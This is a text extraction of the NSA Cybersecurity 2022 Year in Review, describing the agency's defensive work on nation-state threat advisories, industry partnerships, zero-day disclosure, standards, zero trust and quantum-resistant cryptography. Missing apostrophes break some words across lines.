The Department of Justice unsealed
an indictment charging three Iranian
nationals with engaging in ransomwarestyle extortion against U.S. critical
infrastructure providers.
The Department of Treasury
s Office of
Foreign Assets Control sanctioned 10
actors and two entities.
The Department of State Rewards for
Justice released a notification offering
a reward of up to $10 million for
information on three IRGC employees.
By increasing awareness and helping to
secure systems, NSA and its partners
degraded the malicious activity.
PHOTO COURTESY OF U.S. DEPARTMENT OF STATE
The State Department offered a reward of up to $10 million for info on three IRGCaffiliated actors.
Find us social media: @NSACyber
NSA CYBERSECURITY | 2022 YEAR IN REVIEW
PHOTO COURTESY OF GETTY IMAGES
NSA and its partners released three Cybersecurity Advisories in early 2022 about potential Russian threats to U.S. critical infrastructure, including the energy sector.
DEFENDING THE HOMELAND
AGAINST RUSSIA
As Russia invaded Ukraine in early 2022 and
the U.S. held Russia accountable, intelligence
indicated that the Russian government was
exploring options for potential cyberattacks
against the U.S., including its critical
infrastructure sectors.
NSA, CISA, and FBI issued Cybersecurity
Advisories in January, February, and April to
heighten awareness of the threat and promote
understanding of Russian state-sponsored
and cybercriminal tactics, techniques, and
procedures (TTPs) so that net defenders
could strengthen their defenses.
www.NSA.gov/cybersecurity
Through operational collaboration with
Defense Industrial Base companies and
their service providers, NSA
s Cybersecurity
Collaboration Center (CCC) played a leading
role in protecting key critical infrastructure
sectors. The CCC conducted more than
2,000 bidirectional exchanges in the first
four months of 2022, sharing NSA
s insights,
actionable information on Russian cyber TTPs,
and building a more fulsome intelligence
picture with industry
s help.
Throughout the conflict in Ukraine, NSA has
provided foreign signals intelligence insights
that have aided U.S. Government leaders,
NATO and the U.S. European Command
RESPONDING TO NATIONAL THREATS AND PRIORITIES
(EUCOM). It has also provided cryptographic
security products to meet unplanned
emergent requirements and to support
urgent missions. It has rapidly deployed more
than 150 communications security (COMSEC)
devices to support mission operations during
the global crisis.
EXPOSING CHINA
S MALICIOUS
ACTIVITY
NSA continues to highlight the Common
Vulnerabilities and Exposures (CVEs) and
TTPs that People
s Republic of China (PRC)
state-sponsored cyber actors rely on to
compromise systems and steal sensitive
information. In June, NSA partnered with
FBI and CISA to release the Cybersecurity
Advisory, 
People
s Republic of China StateSponsored Cyber Actors Exploit Network
Providers and Devices.
The advisory discusses how PRC actors have
established a broad network of compromised
infrastructure. They
ve compromised major
telecommunications companies and network
service providers primarily by exploiting
publicly known vulnerabilities.
The details in this advisory make it clear that
network devices, including small office/home
office (SOHO) routers and network attached
storage devices, can be a security risk and
should be secured by patching and disabling
unnecessary ports and protocols.
NSA released a Cybersecurity Advisory that highlighted how People
s Republic of China actors were exploiting network service providers and their devices.
Find us social media: @NSACyber
www.NSA.gov/cybersecurity
PARTNERING WITH INDUSTRY
PARTNERING WITH INDUSTRY
s Cybersecurity Collaboration Center
(CCC) plays a key role in whole-of-government
and international efforts to advance
cybersecurity. NSA brings unique resources
to the fight: Its foreign signals intelligence
(SIGINT) system and cybersecurity operations
across National Security Systems (NSS)
generates unique insights into nation-state
intentions and capabilities in cyber. At the
CCC, NSA fuses those insights with those
from private-sector partners to deliver inteldriven cybersecurity that protects the nation
and U.S. allies.
The CCC defends the U.S. Defense Industrial
Base (DIB) and disrupts the adversary by
sharing timely threat intelligence with highimpact partners, best positioned to scale
detection and mitigation techniques to
billions of endpoints.
In 2022, the CCC nearly tripled its partnerships,
growing from 110 partners to more than
300 collaborative relationships. The CCC
partners now reach a cumulative, estimated
2 billion endpoints, and its DIB prime partners
In late 2020, NSA opened the
Cybersecurity Collaboration Center,
an unclassified facility outside the
NSA-Washington fence line. This
year, the CCC expanded to four new
satellite locations: Georgia, Texas,
Hawaii, and the United Kingdom.
account for 80 percent of Department of
Defense (DoD) acquisition spending.
In the past year, the CCC also doubled its
analytical exchanges with these partners.
Thanks to more than 10,000 bidirectional
collaborations 
 primarily focused on Russian
and People
s Republic of China (PRC) cyber
threats and responding to world events 
billions of endpoints have been hardened
against nation-state threats.
For example, if NSA shares a nation-state
actor
s malware or tactics, techniques, and
procedures (TTPs) with an internet service/
cloud provider with a global footprint, the
provider can develop and deploy signatures
to defend against the threat at scale. While
the CCC
s primary goal is to defend the DIB,
its efforts cascade protection across all 16
U.S. critical infrastructure sectors, reach
businesses and consumers, and even protect
our allies.
Our partnership with industry goes
beyond intelligence sharing.
s better defined as operational
collaboration. By building trust, talking
continuously, and focusing our efforts
on shared priorities, we
re achieving
incredible outcomes.
Morgan Adamski,
NSA Cybersecurity Collaboration Center Chief
OPERATIONALIZING INTELLIGENCE
THROUGH PRIVATE-SECTOR
PARTNERS
Find us on social media: @NSACyber
NSA CYBERSECURITY | 2022 YEAR IN REVIEW
OUR INDUSTRY PARTNERS ARE SAYING:
s PDNS and vulnerability scanning are incredibly valuable.
They are helping us illuminate our supply chain and provide
better protection to small companies who need it.
DISCLOSING ZERO-DAY
VULNERABILITIES
To see how NSA
s partnerships help secure
the world, look no further than its work to
discover and disclose vulnerabilities in core
technology products. In 2022, the CCC
disclosed dozens of zero-day vulnerabilities
to vendors, ensuring dangerous bugs can be
remediated.
For example, the CCC partnered with the
United Kingdom
s National Cyber Security
Center (NCSC) this year to jointly disclose a
critical cryptographic vulnerability in Microsoft
Windows. The vulnerability could allow
attackers to manipulate public certificates
that spoof their identity and perform actions
such as authentication or code signing.
In the hands of a capable adversary, the flaw
could have very potent impacts. Thanks to
the power of NSA
s industry and international
partnerships, the vulnerability was quickly
disclosed to Microsoft and patched for all
In 2022, the CCC disclosed
dozens of zero-day
vulnerabilities to vendors,
ensuring dangerous bugs
can be remediated.
www.NSA.gov/cybersecurity
While the CCC
s primary goal
is to defend the DIB, its efforts
cascade protection across all
16 U.S. critical infrastructure
sectors, reach businesses and
consumers, and even protect
our allies.
users running supported versions of Windows
through automatic updates.
This was the first joint vulnerability disclosure
between NSA and an international partner.
SCALING DIB DEFENSE
To protect sensitive U.S. Government
information, combat the PRC
s theft of
intellectual property, and ensure small-tomedium-size businesses (SMBs) benefit from
strong cyber hygiene, the CCC provides NSAmanaged, no-cost cybersecurity services to
more than 150 enrollees. This ensures SMBs
t have to defend against nation-state
threats alone.
s suite of cybersecurity services are
infused with technical indicators of known
malicious activity that are derived from its
SIGINT mission. Its Protective Domain Name
System (PDNS) service alone is clearing
close to 100 million DNS queries daily, and
has blocked around 400 million malicious
PARTNERING WITH INDUSTRY
At the Cybersecurity Collaboration Center, industry and
government experts can collaborate to counter malicious activity.
It is also critically important to measure success. The CCC tracks
key performance indicators on a monthly and quarterly basis for
quantitative feedback, but it also receives qualitative feedback.
We get this feedback from both our industry partners, and,
thanks to our global SIGINT system, we get feedback directly
from our adversaries, too,
 said Morgan Adamski, CCC Chief.
So we know that this operational collaboration
is making an impact.
domains to date. That includes nationstate spear-phishing attempts, malware
and, botnets.
NSA then shared those insights with its PDNS
provider, who identified and eradicated
nation-state malware on DIB networks.
The CCC has also used its PDNS analytics,
which are informed by NSA
s big data analysis
expertise, to enable more successes. NSA
analytics have identified domains that are not
known to be malicious, but the behavior of
the DNS call-out is consistent with malware.
The CCC also offers threat intelligence
collaboration services. These are underpinned
by voluntary sharing agreements and mutual
non-disclosure provisions that allow DIB
companies to share company-sensitive
information with the CCC. In turn, the CCC
Find us on social media: @NSACyber
NSA CYBERSECURITY | 2022 YEAR IN REVIEW
can share sensitive threat information relevant
to the participating companies. This enables
sharing tippers and threat reporting, enriching
public-private understanding of shared
threats, and creates the ability to benefit from
each other
s insights and data pools.
services are available to any company that
has an active DoD contract (sub or prime) and
has access to non-public DoD information.
To enroll, visit cybercenter.NSA.gov or email
DIB_Defense@cyber.nsa.gov.
Through its vulnerability scanning and
remediation services, the CCC also works with
willing DIB partners to identify and resolve
vulnerabilities prior to their exploitation.
This enables the CCC to proactively engage
with partners on issues before they become
compromises. The CCC provides tailored
reports that help companies prioritize their
vulnerability management based on:
DEVELOPING CONSENSUS-BASED,
INDUSTRY-DRIVEN STANDARDS
Where they might have assets
they didn
t know about
Where they might be vulnerable
How they should then prioritize those
vulnerabilities based off of severity
and current nation-state targeting
NSA consistently receives feedback that this
context of 
what should I prioritize and when
is really helpful to DIB SMBs.
To date, the CCC has focused on enrolling
companies that support critical DoD programs
for cryptography, weapons and space, and
nuclear command and control, but in 2023,
the CCC is focused on scaling these services
to thousands of qualifying companies. These
Standards have traditionally been viewed
as an economic tool. Recent changes in
standards development processes make it
clear that they are also a national security
tool. Standards are critically important
because they:
Directly underpin national
security and the economy by
integrating security into products
early in their development
Reduce the risk that manufacturers
and their customers become
victims of exploitation because of
insecure or weak technologies
Allow for interoperability between
technologies, so the U.S. is not
reliant on single market vendors
s Center for Cybersecurity Standards
(CCSS) is directly securing standards for
These services are available
to any company that has an
active DoD contract (sub
or prime) and has access to
non-public DoD information.
OUR INDUSTRY PARTNERS ARE SAYING:
I applaud NSA
s PDNS efforts; initiatives to scale protections to the
small businesses in our supply chain are critical and we want more.
www.NSA.gov/cybersecurity
PARTNERING WITH INDUSTRY
emerging technology. NSA plays an important
role in international standards development
organizations (SDOs) because it possesses
the technical expertise to draft strong
standards and a vested interest in securing
the technologies that impact national security
and defense (e.g. cloud, 5G).
CCSS is focused on authoring, informing,
and driving adoption of standards for
telecommunications, with a focus on securing
the 5G core, edge, and data in transit, cloud,
and secure internet protocols, especially
preparing protocols for quantum-resistant
cryptography.
To date, CCSS has authored and submitted
more than 35 standards for 5G, cloud
networks, and internet protocols. This work
ensures security is baked in and reduces our
adversaries
 ability to steal U.S. intellectual
property.
Through the Enduring Security Framework
and CCSS, NSA has joined forces with industry
OUR INDUSTRY PARTNERS
ARE SAYING:
Our threat analysis group
is focused on stopping APTs
from using our platform. Our
partnership with NSA
is paving the way. They
recently helped us stop
a nation-state APT from
abusing our platform
to target the DIB.
PHOTO COURTESY OF DEFENSE CONTRACT MANAGEMENT AGENCY
Defense Industrial Base companies design, develop, operate, and maintain the Department of Defense
s critical systems, platforms, and technologies required to defend the nation.
Experts from NSA
s Cybersecurity Collaboration Center work directly with these companies to protect sensitive information.
Find us on social media: @NSACyber
NSA CYBERSECURITY | 2022 YEAR IN REVIEW
OUR INDUSTRY PARTNERS ARE SAYING:
Information sharing is good, but only if it is actionable.
The CCC gives us actionable information.
PHOTO COURTESY OF GETTY IMAGES
s Center for Cybersecurity Standards
has submitted more than 35 standards for 5G,
cloud, and internet protocols this year.
to reinvigorate U.S. and allied investment
in Standards Development Organizations
(SDOs). This ensures the long-term security
of critical technologies. The group will
assess technical and geopolitical threats to
international SDOs and develop strategies to
counter these threats.
NSA and its U.S. Government, industry and
international partners increase awareness
about the threats to standards and strategize
to combat these threats. The greatest way
to combat foreign adversarial influence in
international SDOs is for like-minded nations
 those that share the same values of security,
privacy, and global market competition 
to contribute technically sound standards
proposals.
Commercial products are increasingly relied
on to secure National Security Systems.
Through the National Information Assurance
Program (NIAP), the CCC certified 74
commercial components for protecting NSS.
Additionally, NIAP published nine Protection
www.NSA.gov/cybersecurity
Profiles to raise security in those products.
Protection Profiles are vendor-agnostic
guidelines that raise security in commercial
products by defining minimum security and
testing requirements.
NIAP continued to strengthen the global IT
security posture through ongoing partnerships
with 30 nations within the Common Criteria
Recognition Arrangement (CCRA). The CCRA
guarantees consistent evaluations between
members and mutual recognition to allow
vendors to test once and then sell in multiple
countries. It has positioned the United States
as a leader within the global community
through further adoption of its standards and
by certifying more products than any other
nation within the CCRA.
NIAP volunteered to take a leadership
position in the CCRA by chairing the CCRA
Management Committee through the end of
2023, to include leading integration with the
European Union (EU) Cybersecurity Act.
PHOTO COURTESY: GETTY IMAGES
By clearly articulating the
threats, NSA
s reports help
net defenders prioritize
actions that degrade the
malicious actors
 capabilities
and secure critical systems.
ARMING NET DEFENDERS WITH GUIDANCE
ARMING NET DEFENDERS
WITH GUIDANCE
COLLABORATIVE REPORTS
BUILD FULLER PICTURE
s public reports are adorned with more
agency seals than ever before, which speaks
to the increased collaboration between U.S.
and international partners around critical
cybersecurity issues.
Whether it is mitigating against a significant
vulnerability or defending against specific
adversary and cybercriminal threats, U.S.
and international agencies are capitalizing on
opportunities to build a more comprehensive
threat understanding and present top
defensive actions with a coordinated voice.
NSA collaborated with international partners
on nearly two-thirds of its public cybersecurity
releases from the past year.
Throughout 2022, NSA focused on producing
guidance that is unique, timely, and actionable.
It released its first of three Cybersecurity
Advisories about Russian threats to U.S.
critical infrastructure more than a month
before Russia invaded Ukraine. NSA also
These Cybersecurity Advisories attribute
activity to specific nation-state and
cybercriminal groups. By clearly articulating
the threats, the reports helped net defenders
prioritize actions that degrade the malicious
actors
 capabilities and secure critical
systems. This makes it more difficult and
more costly for these actors to compromise
U.S. and allied networks. NSA also highlighted
broader threats, such as ransomware trends,
top exploited vulnerabilities, and how
malicious actors take advantage of weak
security controls.
s technical experts aren
t afraid to get
in the weeds. They published lengthy
technical reports on securing PowerShell
scripting, network infrastructure guidance,
protecting satellite
communications,
and even microelectronics hardware
assurance best practices.
The number of new reported vulnerabilities increases each year,
making it hard for net defenders to prioritize patching
and remediation efforts. Our publications help cut through the
noise. We alert defenders to the highest priority cyber threats
and provide actionable recommendations for mitigation.
Neal Ziring, NSA Cybersecurity Technical Director
highlighted new tactics, techniques, and
procedures (TTPs) from People
s Republic
of China and Iranian state-sponsored actors.
Find us on social media: @NSACyber
DEFENDING OUR MOST CRITICAL NETWORKS
DEFENDING OUR MOST
CRITICAL NETWORKS
PRESIDENTIAL MEMO EXPANDS
S AUTHORITY TO PROTECT
KEY SYSTEMS
In January, President Joe Biden signed the
Memorandum on Improving the Cybersecurity
of National Security, Department of Defense,
and Intelligence Community Systems.
 Better
known as National Security Memo-8 (NSM-8),
the memo set cybersecurity requirements for
protecting some of the nation
s most sensitive
networks 
 National Security Systems (NSS)
 that meet or exceed the requirements
previously set in Executive Order (E.O.) 14028,
Improving the Nation
s Cybersecurity.
NSM-8 provided the NSA Director, as the
National Manager for NSS, with new
authorities that increased NSA
s cybersecurity
visibility into networks that contain classified
information or are otherwise critical to
military and intelligence activities across the
U.S. Government. It also positioned NSA to
set priorities 
 such as requiring that NSS
owners mitigate against a vulnerability being
exploited by our adversaries 
 and direction
 such as requiring that owners employ
proven
cybersecurity
solutions
like
multifactor authentication.
This increased responsibility led NSA to form
even closer relationships with the more than
50 departments and agencies across the U.S.
Government that own or operate NSS.
NSA established foundational policies,
procedures, and workflows to improve
the cybersecurity posture of critical U.S.
Government systems, created inventories and
databases to capture data, and supported
U.S. Government efforts to update the
Federal Acquisition Regulation, Defense
Federal Acquisition Regulation Supplement,
and other cyber-related directives.
Since the memo was signed, NSA has released
nearly two dozen directives and memoranda
leveraging the new authorities to improve the
cybersecurity of NSS on topics such as:
The process for identifying and
inventorying critical NSS and
non-compliant cryptography
The requirements for implementing
multifactor authentication
and data encryption
Mitigations for identified threats
to or vulnerabilities within crossdomain solutions, VMware,
and Atlassian Confluence
National Security Memo-8 is a game-changer because it expanded
s authorities to protect National Security Systems. This gives us
better cybersecurity oversight, allows us to mitigate more vulnerabilities,
and requires that proven cybersecurity solutions be implemented.
Rob Joyce, NSA Cybersecurity Director
Find us on social media: @NSACyber
NSA CYBERSECURITY | 2022 YEAR IN REVIEW
Through partnerships with other federal
agencies, increased visibility within the
national security community, and increased
authorities to mandate vulnerability
remediation, NSA is drastically increasing the
security of critical U.S. Government systems 
protecting sensitive military and intelligence
data from our adversaries.
RAISING THE BAR ON
CROSS- DOMAIN SOLUTIONS
Cross-domain solutions allow information to
be shared across international, government,
agency, and classification boundaries
through controlled interfaces. The U.S.
Government relies on NSA
s National CrossDomain Strategy & Management Office
for cross-domain solution capabilities and
mission needs.
NSA set the 
Raise the Bar
 strategy for
cross-domain solutions that protect classified
information. It focuses on improving crossdomain solution security and capabilities for
NSS in the stages of design, development,
assessment, and implementation.
NSA significantly accelerated Raise the Bar
compliance in 2022, while working closely with
the vendor community on the development
of remote management (RMAN) and remote
monitoring (RMON) capabilities. Several of
these products have entered the lab-based
security assessment process for projected
availability to the community in 2023. This
increased capability will continue to improve
the security posture of the greater NSS
through better management and monitoring.
www.NSA.gov/cybersecurity
ADVOCATING FOR
ZERO TRUST, CLOUD
Traditional cybersecurity centered on a
perimeter-defense model is ineffective
against malicious cyber actors. Once inside
the network, the actors can move laterally,
escalate privileges, and compromise the
mission. The only way to protect critical
resources is through a data-centric model.
Zero trust is a cybersecurity strategy and
framework that embeds security throughout
the architecture for the purpose of preventing,
detecting, and responding to data breaches.
This security model eliminates the idea of
trusted or untrusted networks, devices,
personas, or processes and instead constantly
interrogates the trust relationships formed by
entities on the network and denies access by
default, only allowing access by an approved
user and device.
To demonstrate the efficacy of zero trust
architectures in a government environment,
and to enable NSA to publish well-informed
guidance to the community, NSA built the
Native Zero Trust Cloud (NZTC) environment
 a private cloud that implements zero
trust principles at the advanced level of the
Department of Defense (DoD) Maturity Model.
s zero trust experts also partnered
with the DoD CIO, Defense Information
Systems Agency (DISA), Cybersecurity and
Infrastructure Security Agency (CISA), and
subject matter experts from across the U.S.
Government and industry to provide guidance
to national-level strategies and roadmaps, and
publish reference architectures for successful
implementation. These documents will be
used by DoD commands, military services,
agencies, and mission owners as guides
DEFENDING OUR MOST CRITICAL NETWORKS
NSA is drastically increasing the security
of critical U.S. Government systems
 protecting sensitive military and
intelligence data from our adversaries.
PHOTO COURTESY OF LANCE CPL. GAVIN UMBOH, U.S. MARINE
to help them modernize and harden their
mission infrastructures.
The U.S. Government is increasingly
moving to cloud computing environments.
Because adversaries often target the cloud,
NSA has a strategy to protect NSS, the
Defense Industrial Base, and other critical
infrastructure sectors in cloud, hybrid cloud,
and multi-cloud environments. The agency
is collaborating with industry, academia,
and U.S. and allied government partners to
improve the hardening of clouds, detection of
threats, and the development of actionable,
scalable mitigations.
RED, BLUE, HUNT TEAMS
ASSESS CYBERSECURITY
NSA cybersecurity assessment teams
conduct operations with U.S. Government
and Defense Industrial Base partners to
identify critical cyber vulnerabilities on their
networks and provide mitigation strategies.
This helps protect the underlying information
technology across multiple domains from
cyber adversaries.
s red, blue, and hunt teams completed
27 assessments this past year against critical
networks and platforms across the U.S.
Government. They identified vulnerabilities on
partner networks and significantly improved
the security posture of our critical networks
around the globe and our strategic weapons
and space platforms.
In 2022, NSA evolved its model to conduct
integrated red, blue, and hunt assessments.
After a cleared defense contractor was
compromised, NSA tested the updated
model and discovered new adversary tactics,
which empowered the contractor to prevent
and eradicate these new threats. NSA
shared the new threat intelligence with its
industry partners.
Find us on social media: @NSACyber
NSA delivered 140,000 tamper-indicating
products globally in 2022. These technologies
prevent or detect physical exploitation of
cryptographic equipment and classified material
during shipping or deployment around the world.
PHOTO COURTESY OF U.S. ARMY STAFF SARGENT. CHRISTOPHER STEWART
140,000
CREATING CRYPTOGRAPHY TO PROTECT DATA, COMMUNICATIONS
CREATING CRYPTOGRAPHY TO PROTECT
DATA, COMMUNICATIONS
PROTECTING OUR NATION
MOST CRITICAL SECRETS
Through its keys, codes, and cryptography
mission, NSA secures millions of devices
around the world and manages the
infrastructure to key those devices. That
includes producing and distributing the keys,
codes, and cryptographic materials that the
U.S. Government and military use to secure
weapons, satellites, communications, and
many other systems in which national security
critically relies.
On the battlefield, this helps warfighters
have confidence in their operational picture,
differentiate between friend and foe, and
securely conduct command and control.
If you don
t want the adversary to
know it, control it, or deny your use of it, then
Our goal is to implement quantumresistant cryptography for all National
Security Systems by 2033. That
may sound like it
s a long way off,
but modernization at scale takes
time. We have to plan now.
Troy Lange, Chief,
NSA Encryption Production and Solutions
encryption is your last line of defense,
 said
Troy Lange, Chief, NSA Encryption Production
and Solutions.
NSA works with its government partners to
ensure key management functions, networks,
systems, and communications devices used
by the Department of Defense (DoD) are
secure. It also delivers communications
security best practices that ensure secure
handling of cryptographic material used with
these systems and devices.
In 2022, NSA supported 61 unique customers
on critical operations such as GPS key for U.S.
Space Command. NSA also provided support
to combatant commands and government
agencies, such as U.S. Strategic Command, U.S.
Central Command, the Defense Information
Systems Agency, the Department of Energy,
the White House Communications Agency,
and many more.
MOVING TO QUANTUM-RESISTANT
CRYPTOGRAPHY
A cryptanalytically relevant quantum
computer (CRQC) 
 once achieved 
 has the
potential to break cryptographic systems that
secure the internet and information systems
worldwide today. The best defense against
this looming technological threat is quantumresistant cryptography.
President Joe Biden signed 
Promoting
United States Leadership in Quantum
Computing While Mitigating Risks to
Vulnerable Cryptographic Systems
also known as National Security Memo 10
Find us on social media: @NSACyber
NSA CYBERSECURITY | 2022 YEAR IN REVIEW
(NSM-10) 
 in May to direct U.S. Government
agencies to migrate vulnerable cryptographic
systems to quantum-resistant cryptography
as part of a multi-year transition.
Office of the Director of National Intelligence
Science and Technology (ODNI S&T) office,
the DoD, and external standards organizations
to take on the quantum computing threat.
As the National Manager for National
Security Systems (NSS), the NSA Director is
responsible for overseeing this transition to
quantum-resistant crypto across the 50-plus
government departments and agencies
that use NSS.
NIST announced its quantum-resistant
algorithm selections for standardization in
July, paving the way for NSA to provide its
recommendations for securing NSS. NSA
cryptographers partnered closely with NIST
throughout its selection process, analyzing
the candidates against NSS cybersecurity
requirements.
Because the quantum computing threat
is a shared cybersecurity challenge for
government and private partners, and even
the public, forming strategic and tactical
partnerships has been key.
NSA collaborated with the National Institute of
Standards and Technology (NIST) 
 the U.S.
government lead for commercial algorithm
approval 
 as well as the Cybersecurity and
Infrastructure Security Agency (CISA), the
PHOTO COURTESY OF GETTY IMAGES
In September, NSA released its Commercial
National Security Algorithm Suite 2.0 (CNSA
Suite 2.0) through a Cybersecurity Advisory,
fulfilling a key responsibility under NSM-10. The
publication notified NSS owners, operators,
and vendors of the future requirements
for quantum-resistant algorithms for use
in all NSS.
NSA is urging industry to plan now to adopt
its quantum-resistant algorithm suite for NSS
and NIST
s cryptographic standards into their
systems. Modernization at this scale takes
time and the entire community must start
resourcing now for an orderly transition.
Industry should plan for sufficient storage,
bandwidth, and power in their products
to allow a drop-in of the algorithms and
parameters once they are standardized.
MORE ABOUT CNSA 2.0
Cryptography helps secure critical U.S. military communications.
www.NSA.gov/cybersecurity
The Cybersecurity Advisory specifies
the conventions for using the NSA
CNSA Suite algorithms in Internet
Protocol Security (IPsec). Developers
and operators should visit NSA.gov/
cybersecurity to learn more.
CREATING CRYPTOGRAPHY TO PROTECT DATA, COMMUNICATIONS
PHOTO COURTESY OF SGT. ANTHONY ORTIZ, 2ND MARINE LOGISTICS GROUP
NSA certified the Secure Cyber Module
(SCM), which provides cryptographic
capabilities to the Explosive Ordnance
Disposal (EOD) robots in advanced EOD
and man-transportable robotic systems.
The crypto embedded within the SCM
provides confidentiality services to allow
secure remote operation of EOD robots.
Once industry submits their quantumresistant technologies through NSA and
National Information Assurance Partnership
(NIAP) validation programs, their products will
become available and the U.S. Government
will then start the acquisition process to get
products into national security networks.
ensuring that security requirements,
tailored for each solution, were met.
Many of these products are upgrades
to strengthen the security of existing
devices such as multichannel radios,
tactical receivers, data links, and the
GPS IIIF satellites. The certified products secure intelligence sharing, info for
combat threat awareness, tactical data
and voice, as well as space and weapons systems.
MODERNIZING CRYPTOGRAPHY
The transition to quantum-resistant
cryptography is just one example of how
NSA is staying one step ahead of our nation
adversaries to protect our most sensitive
data. NSA is continually modernizing its
cybersecurity solutions to be agile, threat
adaptive, and scalable across multi-domain
operations. A few 2022 modernization
successes include:
NSA delivered another set of updated
cryptographic devices that implement
NSA-approved government off-theshelf quantum-resistant algorithms to
protect NSS from potential adversarial
quantum computing attacks. The initial
set was delivered in 2021. While a CRQC
remains theoretical, the development
and use of one could make key
portions of the U.S. cryptographic
inventory obsolete.
NSA certified 21 high assurance cryptographic solutions in 2022, after
NSA collaborated with partners to
complete an initial assessment of 2022
NIST quantum-resistant cryptography
selections in support of tactical use
cases. The preliminary results indicate
the selections will, in general, meet or
exceed performance thresholds for
use on tactical devices. These results
improve NSA
s advisement to tactical
customers, program offices, and vendors
on cryptographic implementation
efforts. Faster implementation will
accelerate adoption of quantumresistant cryptography and mitigate
quantum cryptanalytic threats.
Find us on social media: @NSACyber
NSA CYBERSECURITY | 2022 YEAR IN REVIEW
PROTECTING THE WARFIGHTER
AND SUPPORTING THE
COMBATANT COMMANDS
As a combat support agency under the
Department of Defense (DoD), NSA supports
U.S. military service members through its
primary missions: foreign signals intelligence
and cybersecurity.
s foreign signals intelligence experts
provide intelligence support to military
operations, while its cybersecurity experts
provide products and services that ensure
military communications and data remain
secure. NSA
s keys, codes, and cryptography
work secures everything from tactical radios
on the warfighter to their critical weapons
systems. This protects warfighters from U.S.
adversaries and gives them an advantage on
the battlefield.
Interoperability is crucial for the U.S. military
when conducting joint operations and
exercises. NSA and standards organizations
set common protocols and standards so that
the U.S. military can securely share information
with U.S. allies, NATO, and coalition forces
around the world.
NSA represents the U.S. in NATO
s information
assurance and cyber defense capability
panel, strengthening relationships with
partner nations and focusing on driving
platform and equipment modernization
to aid interoperable missions. As the U.S.
continues modernizing cryptography, NSA
www.NSA.gov/cybersecurity
is sharing advanced cryptographic logic with
capable NATO partners to help modernize
the NATO enterprise and alliance. Likewise,
the panel is developing technical guidance
and cybersecurity information sharing across
NATO to secure critical networks from
advanced cyber threats.
NSA is developing a key management strategy
for secure distribution from cryptographic
key generation to consumption by an
end cryptographic unit or system that will
include a modern approach of over-thenetwork keying.
SECURING TECHNOLOGIES AND
PROMOTING INTEROPERABILITY
As our warfighters engage against
sophisticated adversaries in
competition and conflict, confidence
in the security of their command
and control, and weapon systems
is an operational imperative.
Delivering products and services
to deny and deter the adversary
while assuring security and creating
advantage for the Joint Force
capabilities is our raison d
etre.
Brigadier General Lorna Mahlock,
NSA Cybersecurity Deputy Director for Combat Support
s cybersecurity
experts provide products
and services that ensure
military communications
and data remain secure.
PHOTO COURTESY OF GETTY IMAGES
NSA CYBERSECURITY | 2022 YEAR IN REVIEW
PHOTO COURTESY OF CPL. MOISES RODRIGUEZ, U.S. MARINE CORPS
Soldiers in the field rely on NSA for secure
communications.
NSA also took initial steps to transition
NATO
s legacy electronic key delivery system
to a modern and secure key management
infrastructure. For non-NATO nations, NSA
installed a software-based black key delivery
solution in four combatant commands,
replacing an unsupportable, legacy system.
The agency is also building a cryptographic
roadmap for each U.S. combatant command
coalition partner. NSA attended Command
and Control Interoperability Board meetings
between U.S. warfighting commands and
their partners to identify critical missions
employing obsolete cryptography and
direct Mission-Driven Modernization, a
three-phased approach that baselines the
partners
 cryptographic posture, maps the
crypto to specific weapon platforms, and
maps the platforms to mission support. This
effort pinpoints where resources must be
committed to ensure partners are secure
against advanced cyber threats across the
warfighting domains and fully interoperable
with U.S. and allied forces.
www.NSA.gov/cybersecurity
EVALUATING WEAPONS
AND SPACE CYBERSECURITY
NSA continued performing critical cybersecurity evaluations on some of the nation
most important weapons and space systems
across all warfighting domains to ensure they
aren
t vulnerable to cyber adversaries.
Through its Department of Defense (DoD)
Strategic Cybersecurity Program (SCP)
Program Management Office, NSA worked in
concert with DoD leaders and the U.S. military
services to evaluate the systems and issue
plans for mitigating vulnerabilities, modernizing cryptography, and recommendations
for monitoring.
NSA also continued its efforts to modernize encryption across the U.S. combatant
commands. By working with U.S. Cyber
Command and Joint Force HeadquartersDepartment of Defense Information Networks
(JFHQ-DODIN), NSA is reducing the chance
that U.S. adversaries can access warfighter
communications and sensitive data.
PROTECTING THE WARFIGHTER AND
SUPPORTING THE COMBATANT COMMANDS
NEXT-GENERATION NUCLEAR
COMMAND, CONTROL AND
COMMUNICATIONS (NC3)
CYBERSECURITY
data, protection of transport, and protection
of interfaces 
 that will help secure and
guide the development of the nation
s most
critical networks.
NSA helps secure communication between
senior leaders and ensure command and
control of strategic forces by preventing
and eradicating cyber threats to U.S. nuclear
command and control systems (NCCS)
and the National Leadership Command
Capability (NLCC).
NSA also completed an effort to provide NC3
cybersecurity data ontologies to the NEC. As
part of a larger NC3 Enterprise data ontology
effort, these cybersecurity ontologies will
enable effective and efficient information
sharing, consistent responses to cyber events
in the Next Generation NC3 enterprise, and
enable interoperability of solutions developed
by different vendors.
Last year, NSA created a nuclear command,
control, and communications (NC3)
cybersecurity strategy and framework for
the U.S. Strategic Command (USSTRATCOM)
NC3 Enterprise Center (NEC). USSTRATCOM
deters strategic attack and employs forces,
as directed, to guarantee the security of the
U.S. and its allies.
In 2022, NSA created a framework for securing
the next-generation of NC3 networks. It
focuses on three core areas 
 protection of
SECURING NSS WITH COMMERCIAL
SOLUTIONS
s Commercial Solutions for Classified
(CSfC) program enables commercial
technologies and products to be composed
in layered solutions to protect classified
information.
CSfC Capability Packages protect National
Security Systems (NSS) by offering a
Find us on social media: @NSACyber
PHOTO COURTESY OF UNITED STATES STRATEGIC COMMAND
NSA works closely with
U.S. Strategic Command to
secure U.S. nuclear command
and control systems.
NSA CYBERSECURITY | 2022 YEAR IN REVIEW
PHOTO COURTESY OF GETTY IMAGES
The annual CSfC Conference
brings together industry
vendors, trusted integrators and
government organizations to
discuss changes to Capability
Packages, solution registration,
CSfC component listing,
the CSfC Trusted Integrator
program, and more.
robust systems approach for U.S. military
services, combatant commands, the Defense
Information Systems Agency (DISA), FBI, and
other customers. It allows them to quickly
configure and deploy secure cybersecurity
solutions using NSA
s preapproved
systems-level designs and commercially
available components to meet a wide range
of mission use cases. This includes both
within and between secure facilities, as well
as remote access to support telework and
mission outside of normal workspaces.
In 2022, CSfC continued to improve and
update its publicly available Capability
Packages, which guide customers toward
implementing their own solutions. The
Wireless Local Area Network (WLAN)
Capability Package, for example, provides
customers with enhanced security guidance
and protections for operating campus
wireless solutions.
Three new revisions to CSfC Annexes were
published, improving the requirements for key
management, symmetric key management,
and the enterprise infrastructure for CSfC
www.NSA.gov/cybersecurity
Visit NSA.gov/cybersecurity to learn how you can register a CSfC solution.
solutions. These updated Annexes will provide
quantum-resistant encryption, and more
efficient infrastructure for all CSfC solutions.
